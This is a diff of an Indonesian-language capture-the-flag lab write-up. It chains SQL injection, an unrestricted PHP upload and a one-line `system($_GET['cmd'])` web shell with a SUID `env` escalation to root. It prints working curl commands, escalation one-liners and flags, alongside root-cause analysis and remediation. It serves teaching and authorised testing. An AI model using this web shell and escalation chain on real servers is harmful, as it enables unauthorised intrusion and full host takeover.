@@ -1,5 +1,5 @@
 # 02 Write-Up Lab Portrait
-## SQL Injection → Credential Admin → Unrestricted File Upload → RCE `www-data` → Python Capability → Root
+## SQL Injection → Credential Admin → Unrestricted File Upload → RCE `www-data` → SUID `env` → Root
 
 > **Ruang lingkup:** hanya untuk laboratorium, CTF, pembelajaran, atau pengujian yang memiliki izin tertulis.
 >
@@ -16,8 +16,8 @@ Setelah menyelesaikan lab ini, peserta diharapkan mampu:
 3. melakukan enumerasi database secara bertahap menggunakan SQLMap;
 4. memperoleh credential administrator dari database;
 5. mengeksploitasi fitur upload file hingga memperoleh command execution;
-6. melakukan enumerasi Linux capability;
-7. mengeksploitasi `cap_setuid` pada Python untuk memperoleh hak akses root; dan
+6. melakukan enumerasi binary SUID;
+7. mengeksploitasi miskonfigurasi SUID pada `/usr/local/bin/env` untuk memperoleh effective UID root; dan
 8. menyusun evidence dan rekomendasi perbaikan secara sistematis.
 
 ---
@@ -37,9 +37,9 @@ Recon port 8080
 → upload file PHP
 → akses file melalui /uploads
 → RCE sebagai www-data
-→ enumerasi Linux capability
-→ temukan python3.13 cap_setuid=ep
-→ os.setuid(0)
+→ enumerasi binary SUID
+→ temukan /usr/local/bin/env dengan SUID root
+→ jalankan /bin/bash -p
 → command berjalan sebagai root
 → cari dan baca flag
 ```
@@ -55,7 +55,7 @@ Unrestricted File Upload
     ↓
 Remote Code Execution sebagai www-data
     ↓
-Excessive Linux Capability pada Python
+Miskonfigurasi SUID pada /usr/local/bin/env
     ↓
 Privilege Escalation menjadi root
 ```
@@ -66,24 +66,24 @@ Privilege Escalation menjadi root
 
 | Item | Nilai |
 |---|---|
-| Target | `192.168.56.118` |
-| Web | `http://192.168.56.118:8080` |
+| Target | `192.168.56.128` |
+| Web | `http://192.168.56.128:8080` |
 | Login administrator | `/administrator` |
 | Fitur upload | `/profile` |
 | Direktori upload | `/uploads` |
 | Database | `portrait` |
 | Tabel credential | `users` |
 | Credential | `admin:AdminPortr417126` |
-| Web shell | `/uploads/cakgup.php` |
+| Web shell | `/uploads/cakgup1.php` |
 | User awal | `www-data` |
-| Capability rentan | `/usr/bin/python3.13 cap_setuid=ep` |
+| SUID rentan | `/usr/local/bin/env` (`-rwsr-xr-x`, owner `root`) |
 | Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |
 
 Set variabel agar command berikutnya lebih mudah digunakan:
 
 ```bash
-TARGET="192.168.56.118"
-WEB="http://192.168.56.118:8080"
+TARGET="192.168.56.128"
+WEB="http://192.168.56.128:8080"
 LOGIN_URL="$WEB/administrator"
 POST_DATA='username=admin&password=test'
 ```
@@ -378,7 +378,7 @@ SQL Injection tidak hanya memungkinkan bypass login, tetapi juga membaca isi dat
 Akses:
 
 ```text
-http://192.168.56.118:8080/administrator
+http://192.168.56.128:8080/administrator
 ```
 
 Credential:
@@ -391,7 +391,7 @@ Password : AdminPortr417126
 Setelah login, buka:
 
 ```text
-http://192.168.56.118:8080/profile
+http://192.168.56.128:8080/profile
 ```
 
 Cari fitur upload avatar atau upload file.
@@ -403,7 +403,7 @@ Cari fitur upload avatar atau upload file.
 ### Buat File
 
 ```bash
-cat > cakgup.php <<'EOF'
+cat > cakgup1.php <<'EOF'
 <?php system($_GET['cmd']); ?>
 EOF
 ```
@@ -415,7 +415,7 @@ Kode PHP membaca parameter `cmd`, lalu menjalankannya melalui fungsi `system()`.
 Contoh request:
 
 ```text
-/uploads/cakgup.php?cmd=id
+/uploads/cakgup1.php?cmd=id
 ```
 
 Setara dengan menjalankan:
@@ -430,7 +430,7 @@ pada server target.
 
 ## 14. Fase 11 — Upload Web Shell
 
-Upload `cakgup.php` melalui fitur pada `/profile`.
+Upload `cakgup1.php` melalui fitur pada `/profile`.
 
 ### Hal yang Perlu Diamati
 
@@ -446,7 +446,7 @@ Upload `cakgup.php` melalui fitur pada `/profile`.
 Gunakan Burp Suite untuk mengubah bagian multipart seperti berikut:
 
 ```http
-Content-Disposition: form-data; name="file"; filename="cakgup.php"
+Content-Disposition: form-data; name="file"; filename="cakgup1.php"
 Content-Type: image/jpeg
 ```
 
@@ -462,18 +462,51 @@ Isi file tetap:
 
 ## 15. Fase 12 — Validasi Remote Code Execution
 
-### Set URL Shell
+### Tujuan
+
+Membuktikan bahwa file PHP yang berhasil diunggah tidak hanya dapat diakses, tetapi juga dieksekusi oleh web server untuk menjalankan perintah sistem operasi.
+
+### Validasi Awal
 
 ```bash
-SHELL_URL="$WEB/uploads/cakgup.php"
+curl "http://192.168.56.128:8080/uploads/cakgup1.php?cmd=id"
 ```
 
-### Jalankan Command Dasar
+### Evidence
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Interpretasi
+
+Output `id` membuktikan bahwa:
+
+- file `cakgup1.php` berhasil disimpan pada direktori `/uploads`;
+- file dapat diakses secara langsung melalui HTTP;
+- web server memproses file tersebut sebagai script PHP;
+- parameter `cmd` diteruskan ke sistem operasi; dan
+- perintah dijalankan menggunakan akun layanan web `www-data`.
+
+Dengan demikian, temuan telah berkembang dari **unrestricted file upload** menjadi **remote code execution (RCE)**.
+
+### Menetapkan Variabel Target
+
+Agar command berikutnya lebih ringkas, URL web shell disimpan dalam variabel:
 
 ```bash
-curl -sG \
-  --data-urlencode "cmd=id; whoami; hostname; pwd" \
-  "$SHELL_URL"
+TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"
+```
+
+---
+
+## 16. Fase 13 — Identifikasi Konteks Sistem
+
+### Command
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=id; whoami; hostname; uname -a; cat /etc/os-release"
 ```
 
 ### Evidence
@@ -481,148 +514,263 @@ curl -sG \
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data
+portrait
+Linux portrait 5.15.0-178-generic #188-Ubuntu SMP Sun Apr 12 07:19:49 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+PRETTY_NAME="Ubuntu 22.04.5 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.5 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+```
+
+### Hasil Identifikasi
+
+| Informasi | Hasil |
+|---|---|
+| User proses | `www-data` |
+| UID/GID | `33/33` |
+| Hostname | `portrait` |
+| Sistem operasi | Ubuntu 22.04.5 LTS |
+| Kernel | Linux 5.15.0-178-generic |
+| Arsitektur | x86_64 |
+
+### Interpretasi
+
+RCE masih berada pada konteks akun berprivilege rendah. Tahap berikutnya adalah mencari miskonfigurasi lokal yang dapat digunakan untuk meningkatkan hak akses.
+
+---
+
+## 17. Fase 14 — Enumerasi Binary SUID
+
+### Tujuan
+
+Mencari executable yang memiliki bit **Set User ID (SUID)**. Saat binary SUID dijalankan, proses dapat memperoleh effective UID milik pemilik file, yang umumnya `root`.
+
+### Command
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
+```
+
+### Evidence
+
+```text
+/snap/core20/2866/usr/bin/chfn
+/snap/core20/2866/usr/bin/chsh
+/snap/core20/2866/usr/bin/gpasswd
+/snap/core20/2866/usr/bin/mount
+/snap/core20/2866/usr/bin/newgrp
+/snap/core20/2866/usr/bin/passwd
+/snap/core20/2866/usr/bin/su
+/snap/core20/2866/usr/bin/sudo
+/snap/core20/2866/usr/bin/umount
+/snap/core20/2866/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2866/usr/lib/openssh/ssh-keysign
+/snap/snapd/21759/usr/lib/snapd/snap-confine
+/usr/local/bin/env
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/fusermount3
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/libexec/polkit-agent-helper-1
+/opt/VBoxGuestAdditions-7.2.4/bin/VBoxDRMClient
+```
+
+### Temuan Utama
+
+Binary berikut tidak lazim memiliki bit SUID dan perlu diperiksa lebih lanjut:
+
+```text
+/usr/local/bin/env
+```
+
+Binary standar seperti `passwd`, `su`, atau `sudo` memang dapat memiliki SUID karena kebutuhan fungsionalnya. Sebaliknya, salinan `env` pada `/usr/local/bin` dengan SUID root merupakan indikasi miskonfigurasi berisiko tinggi karena `env` dapat digunakan untuk menjalankan program lain.
+
+---
+
+## 18. Memahami Risiko SUID pada `/usr/local/bin/env`
+
+### Pemeriksaan Permission
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=ls -l /usr/local/bin/env"
+```
+
+### Evidence
+
+```text
+-rwsr-xr-x 1 root root 43976 Jun 27 19:36 /usr/local/bin/env
+```
+
+Karakter `s` pada bagian permission pemilik:
+
+```text
+-rwsr-xr-x
+   ^
+```
+
+menunjukkan bahwa bit SUID aktif. Karena file dimiliki oleh `root`, program yang dijalankan melalui binary tersebut dapat mewarisi **effective UID root**.
+
+### Mengapa `bash -p` Digunakan?
+
+Secara default, Bash dapat menurunkan privilege ketika mendeteksi perbedaan antara real UID dan effective UID. Opsi:
+
+```text
+-p
+```
+
+mempertahankan privileged mode sehingga effective UID yang diperoleh dari binary SUID tidak langsung dilepas.
+
+### Validasi Terpadu
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=ls -l /usr/local/bin/env; /usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
+```
+
+### Evidence
+
+```text
+-rwsr-xr-x 1 root root 43976 Jun 27 19:36 /usr/local/bin/env
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+root
+EUID=0
 ```
 
 ### Interpretasi
 
-- file berhasil di-upload;
-- file dapat diakses dari web;
-- server mengeksekusi file sebagai PHP;
-- input `cmd` diteruskan ke sistem operasi;
-- command berjalan dengan user web server `www-data`.
+Output tersebut menunjukkan:
 
-Dengan demikian, temuan telah meningkat dari **unrestricted file upload** menjadi **remote code execution**.
+- **real UID** tetap `33` atau `www-data`;
+- **effective UID** berubah menjadi `0` atau `root`;
+- `whoami` menampilkan `root`; dan
+- command yang dijalankan oleh Bash memperoleh privilege root.
 
----
-
-## 16. Fase 13 — Enumerasi Sistem sebagai `www-data`
-
-### Identitas dan Sistem
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=id; whoami; uname -a; cat /etc/os-release" \
-  "$SHELL_URL"
-```
-
-### Cari Binary SUID
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null" \
-  "$SHELL_URL"
-```
-
-### Cari Linux Capability
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
-  "$SHELL_URL"
-```
-
-### Evidence Utama
-
-```text
-/usr/bin/python3.13 cap_setuid=ep
-```
+Hal ini membuktikan bahwa SUID pada `/usr/local/bin/env` dapat dieksploitasi untuk melakukan privilege escalation.
 
 ---
 
-## 17. Memahami `cap_setuid=ep`
+## 19. Fase 15 — Validasi Privilege Escalation
 
-Linux capability memecah hak istimewa root menjadi kemampuan yang lebih spesifik.
+### Proof of Concept Minimal
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id'"
+```
+
+### Evidence
 
 ```text
-cap_setuid
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 ```
 
-memberikan proses kemampuan untuk mengubah UID.
+### Validasi Akses Direktori Root
 
-Penanda:
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'ls -la /root'"
+```
+
+### Evidence
 
 ```text
-ep
+total 36
+drwx------  6 root root 4096 Jun 28 05:14 .
+drwxr-xr-x 20 root root 4096 Jun 27 19:23 ..
+-rw-r--r--  1 root root    0 Jun 28 05:14 .bash_history
+-rw-r--r--  1 root root 3163 Jun 27 20:00 .bashrc
+drwx------  4 root root 4096 Jun 27 19:57 .cache
+drwx------  5 root root 4096 Jun 27 19:55 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwx------  2 root root 4096 Jun 27 17:11 .ssh
+-rw-------  1 root root   33 Jun 27 19:36 FLAG.txt
+drwx------  3 root root 4096 Jun 28 05:14 snap
 ```
 
-berarti capability tersedia pada set **effective** dan **permitted**. Karena Python dapat menjalankan kode arbitrer, capability ini memungkinkan pemanggilan:
+### Interpretasi
 
-```python
-os.setuid(0)
-```
-
-UID `0` adalah user `root`.
-
-### Mengapa Ini Berbahaya?
-
-Binary interpreter umum seperti Python dapat menjalankan hampir semua fungsi sistem. Memberikan `cap_setuid` pada Python secara praktis memungkinkan user yang dapat menjalankannya untuk memperoleh akses root.
+Akun `www-data` pada kondisi normal tidak memiliki izin membaca isi `/root`. Keberhasilan menampilkan direktori tersebut membuktikan bahwa command telah berjalan dengan effective UID root, bukan sekadar menampilkan teks atau hasil simulasi.
 
 ---
 
-## 18. Fase 14 — Privilege Escalation ke Root
+## 20. Fase 16 — Mencari File Flag
 
-### Proof of Concept
+### Command
 
 ```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
-  "$SHELL_URL"
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"
 ```
 
-### Evidence yang Diharapkan
+### Evidence
 
 ```text
-uid=0(root) gid=33(www-data) groups=33(www-data)
-root
+/root/FLAG.txt
+/FLAG.txt
 ```
 
-> Pada beberapa sistem, group tetap menunjukkan group proses awal. Yang menentukan keberhasilan eskalasi adalah UID/effective UID menjadi `0` dan command dapat mengakses resource root.
+### Interpretasi
+
+Ditemukan dua file flag:
+
+| Path | Konteks |
+|---|---|
+| `/FLAG.txt` | Flag tahap RCE sebagai user web |
+| `/root/FLAG.txt` | Flag tahap privilege escalation menjadi root |
+
+Pencarian dilakukan setelah memperoleh privilege root agar file pada direktori terproteksi dapat ditemukan tanpa terhalang permission.
 
 ---
 
-## 19. Fase 15 — Mencari Flag
+## 21. Fase 17 — Membaca Flag
 
-Jangan menebak nama atau lokasi flag. Cari terlebih dahulu:
+### Command
 
 ```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
-  "$SHELL_URL"
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt; cat /FLAG.txt'"
 ```
 
-### Output Contoh
+### Evidence
 
 ```text
-/root/flag.txt
+FLAG{3nv_3x3c5_r007_1n_p0r7r417}
+FLAG{w3b_2_wwwd474_1n_7h3_p0r7r417}
 ```
 
-Catat path yang benar sesuai output lab.
+### Hasil Akhir
 
----
+| Tahap | Flag |
+|---|---|
+| Root privilege escalation | `FLAG{3nv_3x3c5_r007_1n_p0r7r417}` |
+| Web RCE sebagai `www-data` | `FLAG{w3b_2_wwwd474_1n_7h3_p0r7r417}` |
 
-## 20. Fase 16 — Membaca Flag
-
-Ganti `/PATH/FLAG` dengan path dari hasil `find`:
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; cat /PATH/FLAG\")'" \
-  "$SHELL_URL"
-```
-
-Contoh jika flag berada di `/root/flag.txt`:
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; cat /root/flag.txt\")'" \
-  "$SHELL_URL"
-```
+Keberhasilan membaca `/root/FLAG.txt` merupakan bukti akhir bahwa rangkaian eksploitasi telah mencapai kompromi penuh pada sistem operasi.
 
 ---
 
 # BAGIAN B — ANALISIS TEMUAN
 
-## 21. Temuan 1 — SQL Injection pada Login Administrator
+## 22. Temuan 1 — SQL Injection pada Login Administrator
 
 ### Judul yang Disarankan
 
@@ -634,32 +782,32 @@ Memungkinkan Pembacaan Database dan Pengambilalihan Akun Administrator
 ### Akar Masalah
 
 - input pengguna digabung langsung ke query SQL;
-- aplikasi tidak menggunakan parameterized query/prepared statement;
-- validasi input tidak memisahkan data dan perintah SQL;
-- error atau perbedaan respons cukup untuk mendukung enumerasi.
+- aplikasi tidak menggunakan parameterized query atau prepared statement;
+- validasi input tidak memisahkan data pengguna dari perintah SQL;
+- akun database aplikasi memiliki privilege yang memungkinkan pembacaan tabel credential; dan
+- password administrator tersimpan atau dapat diperoleh dalam bentuk yang dapat langsung digunakan.
 
 ### Dampak
 
 - bypass autentikasi;
-- pembacaan tabel dan data sensitif;
-- pencurian credential;
-- manipulasi atau penghapusan data;
-- menjadi tahap awal pengambilalihan server melalui chained exploit.
+- pembacaan data sensitif;
+- pengambilalihan akun administrator;
+- manipulasi atau penghapusan data; dan
+- menjadi titik awal rangkaian eksploitasi menuju kompromi server.
 
 ### Rekomendasi
 
 1. gunakan prepared statement atau parameterized query;
-2. jangan menyusun query dengan string concatenation;
-3. batasi privilege akun database aplikasi;
-4. jangan menyimpan password dalam plaintext;
-5. gunakan password hashing adaptif seperti Argon2id atau bcrypt;
-6. samakan respons login gagal untuk mengurangi informasi tambahan;
-7. tambahkan logging dan alert untuk pola injeksi;
-8. lakukan code review dan pengujian SAST/DAST pada pipeline pengembangan.
+2. hindari penyusunan query melalui string concatenation;
+3. terapkan prinsip least privilege pada akun database aplikasi;
+4. simpan password menggunakan hashing adaptif seperti Argon2id atau bcrypt;
+5. samakan respons autentikasi gagal;
+6. tambahkan logging dan alert untuk pola injeksi; dan
+7. lakukan pengujian SAST, DAST, dan code review pada pipeline pengembangan.
 
 ---
 
-## 22. Temuan 2 — Unrestricted File Upload Menjadi RCE
+## 23. Temuan 2 — Unrestricted File Upload Menjadi RCE
 
 ### Judul yang Disarankan
 
@@ -670,347 +818,321 @@ Kode PHP sebagai User www-data
 
 ### Akar Masalah
 
-- aplikasi menerima file berdasarkan input pengguna tanpa validasi kuat;
-- validasi hanya mengandalkan ekstensi atau MIME yang dapat dimanipulasi;
-- file disimpan dalam web root;
-- direktori upload mengizinkan eksekusi script;
-- nama file dan lokasi penyimpanan dapat diprediksi atau diakses langsung.
+- aplikasi tidak menerapkan allowlist format file yang kuat;
+- validasi dapat dilewati melalui manipulasi metadata file;
+- file disimpan pada direktori yang dapat diakses langsung dari web;
+- direktori `/uploads` mengizinkan eksekusi script PHP; dan
+- nama serta lokasi file hasil upload dapat diketahui oleh pengguna.
 
 ### Dampak
 
-- remote command execution;
-- pembacaan file aplikasi dan konfigurasi;
-- pencurian credential database;
+- remote command execution sebagai `www-data`;
+- pembacaan konfigurasi dan source code aplikasi;
+- pencurian credential;
 - modifikasi atau penghapusan data;
-- pivot ke jaringan internal;
-- privilege escalation jika terdapat miskonfigurasi host.
+- pivot ke layanan internal; dan
+- akses awal untuk melakukan privilege escalation pada host.
 
 ### Rekomendasi
 
-1. gunakan allowlist ekstensi yang benar-benar diperlukan;
-2. verifikasi MIME menggunakan isi file, bukan hanya header request;
-3. validasi magic bytes dan lakukan decoding/re-encoding untuk gambar;
+1. terapkan allowlist ekstensi dan tipe file yang benar-benar diperlukan;
+2. verifikasi tipe file berdasarkan isi, magic bytes, dan proses decoding;
+3. lakukan re-encoding pada file gambar;
 4. simpan file di luar web root;
-5. ubah nama file menjadi nilai acak yang dibuat server;
-6. nonaktifkan eksekusi script pada direktori upload;
+5. gunakan nama file acak yang dibuat server;
+6. nonaktifkan eksekusi PHP atau script pada direktori upload;
 7. sajikan file melalui endpoint download terkontrol;
-8. terapkan batas ukuran dan scanning malware;
-9. jalankan web server dengan privilege minimum;
-10. tolak ekstensi ganda, karakter khusus, dan format ambigu.
+8. batasi ukuran file dan lakukan pemindaian malware; dan
+9. jalankan layanan web menggunakan privilege minimum dan sandbox yang sesuai.
 
 ---
 
-## 23. Temuan 3 — Python Memiliki `cap_setuid=ep`
+## 24. Temuan 3 — SUID Tidak Aman pada `/usr/local/bin/env`
 
 ### Judul yang Disarankan
 
 ```text
-Excessive Linux Capability pada /usr/bin/python3.13 Memungkinkan
-Privilege Escalation dari www-data menjadi root
+Miskonfigurasi SUID pada /usr/local/bin/env Memungkinkan Privilege
+Escalation dari www-data Menjadi Root
 ```
 
 ### Akar Masalah
 
-Interpreter Python diberikan capability `cap_setuid`, padahal binary tersebut dapat menjalankan kode arbitrer.
+Binary `/usr/local/bin/env` dimiliki oleh `root` dan memiliki bit SUID:
+
+```text
+-rwsr-xr-x 1 root root ... /usr/local/bin/env
+```
+
+Utility `env` dapat menjalankan program lain. Ketika digunakan untuk menjalankan `/bin/bash -p`, Bash mempertahankan effective UID root yang diwariskan dari binary SUID.
 
 ### Dampak
 
-- user lokal atau proses aplikasi dapat memperoleh UID root;
-- seluruh confidentiality, integrity, dan availability server terancam;
-- penyerang dapat membaca file root, mengubah konfigurasi, membuat persistence, atau mengambil alih sistem.
+- proses web berprivilege rendah dapat menjalankan command dengan EUID `0`;
+- file milik root dapat dibaca atau diubah;
+- konfigurasi sistem dapat dimodifikasi;
+- persistence dan pengambilalihan penuh host menjadi memungkinkan; dan
+- confidentiality, integrity, serta availability server terancam sepenuhnya.
 
 ### Rekomendasi
 
-Hapus capability yang tidak diperlukan:
+Hapus bit SUID dari binary tersebut:
 
 ```bash
-sudo setcap -r /usr/bin/python3.13
+sudo chmod u-s /usr/local/bin/env
 ```
 
-Verifikasi:
+Apabila file tersebut bukan bagian dari kebutuhan sistem, hapus salinan yang tidak diperlukan:
 
 ```bash
-getcap /usr/bin/python3.13
+sudo rm -f /usr/local/bin/env
+```
+
+Verifikasi setelah perbaikan:
+
+```bash
+ls -l /usr/local/bin/env
+find / -perm -4000 -type f 2>/dev/null
 ```
 
 Tambahan pengamanan:
 
-- audit capability secara berkala dengan `getcap -r /`;
-- gunakan prinsip least privilege;
-- hindari capability berbahaya pada interpreter, shell, editor, atau utility serbaguna;
-- pantau perubahan capability melalui file integrity monitoring;
-- batasi user web server dengan AppArmor/SELinux atau sandbox yang sesuai.
+- audit seluruh binary SUID secara berkala;
+- bandingkan daftar SUID dengan baseline sistem yang disetujui;
+- hindari SUID pada interpreter, shell, editor, atau utility serbaguna;
+- gunakan file integrity monitoring untuk mendeteksi perubahan permission;
+- batasi kemampuan proses web melalui AppArmor, SELinux, container, atau systemd sandboxing; dan
+- selidiki proses atau mekanisme yang membuat salinan `/usr/local/bin/env` tersebut.
 
 ---
 
-## 24. Ringkasan Risiko Chained Exploit
+## 25. Ringkasan Risiko Chained Exploit
 
-Masing-masing celah sudah berbahaya, tetapi kombinasi ketiganya menghasilkan kompromi penuh:
-
-| Tahap | Celah | Hasil |
+| Tahap | Kerentanan | Hasil |
 |---|---|---|
 | 1 | SQL Injection | Credential administrator diperoleh |
-| 2 | File upload tidak aman | RCE sebagai `www-data` |
-| 3 | Python `cap_setuid` | Root compromise |
+| 2 | Unrestricted file upload | File PHP dapat dieksekusi |
+| 3 | Remote code execution | Command berjalan sebagai `www-data` |
+| 4 | SUID tidak aman pada `env` | Effective UID berubah menjadi root |
+| 5 | Root compromise | Seluruh sistem dan flag terproteksi dapat diakses |
 
 ### Dampak Akhir
 
 ```text
 Unauthenticated attacker
 → administrator aplikasi
-→ command execution
-→ root operating system
+→ upload PHP
+→ RCE sebagai www-data
+→ eksploitasi SUID /usr/local/bin/env
+→ effective UID root
+→ kompromi penuh server
 ```
 
-Severity keseluruhan layak dinilai **Critical** karena eksploitasi berujung pada pengambilalihan penuh server.
+Severity keseluruhan layak dinilai **Critical** karena rangkaian eksploitasi berakhir pada pengambilalihan penuh sistem operasi.
 
 ---
 
 # BAGIAN C — EVIDENCE DAN TROUBLESHOOTING
 
-## 25. Checklist Evidence
+## 26. Checklist Evidence
 
 Simpan bukti berikut untuk write-up atau laporan:
 
 - [ ] hasil Nmap yang menunjukkan port `8080`;
-- [ ] hasil directory enumeration;
+- [ ] hasil enumerasi direktori;
 - [ ] request dan respons baseline login gagal;
 - [ ] parameter `username` yang terkonfirmasi rentan;
-- [ ] output SQLMap `--current-db`;
-- [ ] output SQLMap `--tables`;
-- [ ] output SQLMap `--columns`;
-- [ ] hasil dump credential;
+- [ ] output SQLMap `--current-db`, `--tables`, `--columns`, dan `--dump`;
+- [ ] credential administrator yang diperoleh;
 - [ ] screenshot login administrator;
 - [ ] request upload file dan respons server;
 - [ ] URL file hasil upload;
-- [ ] output `id`, `whoami`, dan `hostname` sebagai `www-data`;
-- [ ] output `getcap -r /` yang menunjukkan `cap_setuid=ep`;
-- [ ] output `id` dan `whoami` setelah `os.setuid(0)`;
-- [ ] hasil pencarian dan pembacaan flag.
+- [ ] output `id` sebagai `www-data`;
+- [ ] output `hostname`, `uname -a`, dan `/etc/os-release`;
+- [ ] daftar binary SUID;
+- [ ] permission `/usr/local/bin/env` yang menunjukkan `-rwsr-xr-x`;
+- [ ] output `id` yang menunjukkan `euid=0(root)`;
+- [ ] bukti akses ke direktori `/root`;
+- [ ] hasil pencarian `/root/FLAG.txt` dan `/FLAG.txt`; dan
+- [ ] hasil pembacaan kedua flag.
 
 ---
 
-## 26. Troubleshooting
+## 27. Troubleshooting
 
 | Masalah | Kemungkinan Penyebab | Solusi |
 |---|---|---|
-| SQLMap tidak menemukan injeksi | Endpoint atau data POST salah | Tangkap request asli dengan Burp dan pastikan parameter benar |
-| SQLMap memakai hasil cache lama | Session SQLMap sebelumnya | Tambahkan `--flush-session` |
-| Redirect mengganggu SQLMap | Endpoint mengalihkan request | Periksa slash pada URL dan respons Burp/curl |
-| Tidak tahu nama database | Tahap discovery dilewati | Jalankan `--current-db` |
-| Tidak tahu tabel | Belum menjalankan enumerasi | Gunakan `-D portrait --tables` |
-| Tidak tahu kolom | Belum menjalankan `--columns` | Gunakan `-T users --columns` |
-| Login admin gagal | Credential salah atau cookie lama | Coba private browser dan pastikan credential tepat |
-| File upload ditolak | Filter ekstensi/MIME | Periksa request multipart dan validasi aktual aplikasi |
-| Web shell `404` | Nama file atau lokasi berubah | Periksa respons upload, source HTML, atau listing `/uploads` |
-| PHP tampil sebagai teks | Direktori tidak mengeksekusi PHP | Cari lokasi penyimpanan lain; jangan klaim RCE sebelum terbukti |
-| `system()` tidak menghasilkan output | Fungsi dinonaktifkan | Periksa `disable_functions`; uji fungsi yang masih tersedia dalam lab |
-| `getcap` tidak ditemukan | Paket capability tidak tersedia/PATH berbeda | Coba `/usr/sbin/getcap` atau cari binary dengan `which getcap` |
-| Python path berbeda | Versi sistem berbeda | Jalankan `getcap -r / 2>/dev/null | grep -i python` |
-| `os.setuid(0)` gagal | Capability tidak aktif atau binary berbeda | Pastikan path sesuai output `getcap` |
-| Flag tidak ditemukan | Nama flag berbeda | Gunakan pencarian case-insensitive dan perluas pola seperlunya |
+| Web shell mengembalikan `404` | Nama atau lokasi file berubah | Periksa respons upload dan source halaman untuk menemukan path aktual |
+| PHP tampil sebagai teks | Direktori upload tidak mengeksekusi PHP | Jangan klaim RCE; evaluasi konfigurasi penyimpanan dan handler PHP |
+| Parameter `cmd` tidak menghasilkan output | Fungsi PHP dibatasi atau format request salah | Uji `id` terlebih dahulu dan gunakan `--data-urlencode` |
+| Command terpotong pada karakter khusus | Encoding query tidak tepat | Gunakan `curl -sG` dan `--data-urlencode` |
+| `find / -perm -4000` terlalu banyak error | Banyak direktori tidak dapat dibaca | Tambahkan `2>/dev/null` |
+| `/usr/local/bin/env` tidak ditemukan | Binary atau path berbeda | Gunakan output enumerasi SUID aktual, jangan menebak path |
+| `bash -p` tidak memperoleh EUID root | SUID telah dihapus atau filesystem memakai `nosuid` | Verifikasi dengan `ls -l`, `mount`, dan output `id` |
+| `whoami` root tetapi `uid` masih 33 | Hanya effective UID yang berubah | Periksa `euid=0`; effective UID menentukan akses privilege proses |
+| Tidak dapat membaca `/root` | Privilege tidak dipertahankan | Pastikan command dijalankan melalui `/usr/local/bin/env /bin/bash -p -c` |
+| Flag tidak ditemukan | Penamaan atau kapitalisasi berbeda | Gunakan `find / -type f -iname 'flag.txt' 2>/dev/null` |
 
-### SQLMap dengan Session Baru
+### Command Diagnostik Ringkas
 
 ```bash
-sqlmap \
-  -u "$LOGIN_URL" \
-  --data="$POST_DATA" \
-  -p username \
-  --batch \
-  --flush-session \
-  --current-db
+curl -sG "$TARGET" --data-urlencode "cmd=ls -l /usr/local/bin/env"
+
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
 ```
 
 ---
 
 # BAGIAN D — CLOSE BOOK
 
-## 27. Alur Hafalan
+## 28. Alur Hafalan
 
 ```text
-nmap 8080
-→ dirsearch
-→ /administrator /profile /uploads
-→ baseline login POST username/password
-→ sqlmap --current-db
-→ portrait
-→ sqlmap --tables
-→ users
-→ sqlmap --columns
-→ username/password
-→ sqlmap --dump
-→ admin:AdminPortr417126
-→ login admin
-→ upload cakgup.php
-→ /uploads/cakgup.php?cmd=id
-→ www-data
-→ getcap -r /
-→ python3.13 cap_setuid=ep
-→ os.setuid(0)
-→ root
-→ find flag
-→ cat flag
+Recon port 8080
+→ SQL Injection login administrator
+→ dump credential admin
+→ login dan upload cakgup1.php
